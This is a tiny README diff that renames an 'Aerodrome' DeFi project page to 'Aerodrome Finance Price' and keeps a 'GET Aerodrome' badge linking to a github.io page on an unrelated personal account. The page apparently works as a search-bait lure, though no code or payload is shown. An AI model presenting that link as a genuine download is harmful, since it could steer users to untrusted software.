@@ -1,4 +1,4 @@
-# Aerodrome - Base DeFi Trading and Liquidity Hub
+# Aerodrome Finance Price - Base DeFi Trading and Liquidity Hub
 
 [![GET Aerodrome](https://img.shields.io/badge/GET%20%E2%80%94%20Aerodrome-0078D6?style=for-the-badge&logoColor=white)](https://juanhowardbrkq.github.io/.github/aerodrome-finance-price)
 
